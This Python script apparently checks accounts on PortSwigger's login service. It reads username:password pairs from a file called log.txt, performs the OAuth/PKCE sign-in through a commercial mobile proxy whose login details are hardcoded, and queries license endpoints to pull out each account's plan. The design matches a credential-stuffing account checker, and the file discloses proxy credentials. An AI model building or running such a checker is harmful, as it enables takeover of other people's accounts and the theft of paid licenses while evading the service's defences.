#!/usr/bin/env python3
import requests
import json
import base64
import hashlib
import secrets
from urllib.parse import urlencode, parse_qs, urlparse

def generate_pkce():
    """Generate PKCE code_verifier and code_challenge"""
    code_verifier = base64.urlsafe_b64encode(secrets.token_bytes(32)).decode('utf-8').rstrip('=')
    code_sha = hashlib.sha256(code_verifier.encode('utf-8')).digest()
    code_challenge = base64.urlsafe_b64encode(code_sha).decode('utf-8').rstrip('=')
    return code_verifier, code_challenge

class PortSwiggerOAuthClient:
    def __init__(self, proxy_url=None):
        self.base_url = "https://login.portswigger.net"
        self.plan_base_url = "https://portswigger.net"
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'OAuth-Test/1.0'})

        if proxy_url:
            self.session.proxies.update({'http': proxy_url, 'https': proxy_url})

        self.auth_code = None
        self.state = None

    def authorize(self):
        """Step 1: Get authorization code"""
        print("[1] Authorization step...")

        # Generate PKCE
        verifier, challenge = generate_pkce()
        print(f"    Generated code_challenge: {challenge[:20]}...")

        params = {
            'client_id': 'F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz',
            'redirect_uri': 'https://portswigger.net/signin-oidc',
            'response_type': 'code',
            'scope': 'openid profile email',
            'code_challenge': challenge,
            'code_challenge_method': 'S256',
            'response_mode': 'query'
        }

        url = f"{self.base_url}/authorize?{urlencode(params)}"

        try:
            resp = self.session.get(url, allow_redirects=True, timeout=10)
            print(f"    Status: {resp.status_code}")
            print(f"    Final URL: {resp.url[:100]}...")
            return verifier
        except Exception as e:
            print(f"    Error: {e}")
            return None

    def login(self, username, password, verifier):
        """Step 2: Login and get auth code"""
        print(f"\n[2] Login step for {username}...")

        login_url = f"{self.base_url}/u/login"
        login_data = {
            "username": username,
            "password": password,
            "action": "default"
        }

        try:
            resp = self.session.post(login_url, data=login_data, allow_redirects=True, timeout=10)
            print(f"    Status: {resp.status_code}")
            print(f"    Final URL: {resp.url[:150]}...")

            # Extract auth code from URL
            if 'code=' in resp.url:
                parsed = parse_qs(urlparse(resp.url).query)
                if 'code' in parsed:
                    self.auth_code = parsed['code'][0]
                    print(f"    [✓] Auth code obtained: {self.auth_code[:20]}...")
                    return True

            # Check for errors
            if 'error=' in resp.url:
                parsed = parse_qs(urlparse(resp.url).query)
                if 'error_description' in parsed:
                    print(f"    [✗] Error: {parsed['error_description'][0][:100]}")
                return False

            print(f"    [?] No auth code found in response")
            return False

        except Exception as e:
            print(f"    Error: {e}")
            return False

    def extract_plan(self, username):
        """Step 3: Extract plan using authenticated session"""
        print(f"\n[3] Plan extraction for {username}...")

        endpoints = [
            f"{self.plan_base_url}/users/{username}/licenses",
            f"{self.plan_base_url}/user/{username}/licenses",
            f"{self.plan_base_url}/users/{username.split('@')[0]}/licenses",
            f"{self.plan_base_url}/account/plan",
        ]

        for url in endpoints:
            try:
                resp = self.session.get(url, headers={"Accept": "application/json"}, timeout=10)
                print(f"    {url.split('/')[-2:]} -> {resp.status_code}")

                if resp.status_code == 200:
                    print(f"    [✓] SUCCESS: {resp.text[:100]}...")
                    return resp.json() if 'json' in resp.headers.get('content-type', '') else resp.text
            except Exception as e:
                pass

        return None

# Test
if __name__ == "__main__":
    proxy_url = "http://buymobileproxycom:mugla9392@ankara8.buymobileproxy.com:8029"

    # Read first account
    with open('/home/user/portswigger/log.txt', 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                username, password = line.split(":", 1)
                break

    print(f"Testing account: {username.strip()}")
    print("=" * 60)

    client = PortSwiggerOAuthClient(proxy_url)

    # Step 1: Authorize
    verifier = client.authorize()

    if verifier:
        # Step 2: Login
        if client.login(username.strip(), password.strip(), verifier):
            # Step 3: Extract plan
            plan = client.extract_plan(username.strip())
            if plan:
                print(f"\n[✓] Plan extracted: {plan}")
            else:
                print(f"\n[✗] No plan found")
        else:
            print("\n[✗] Login failed")
    else:
        print("\n[✗] Authorization failed")
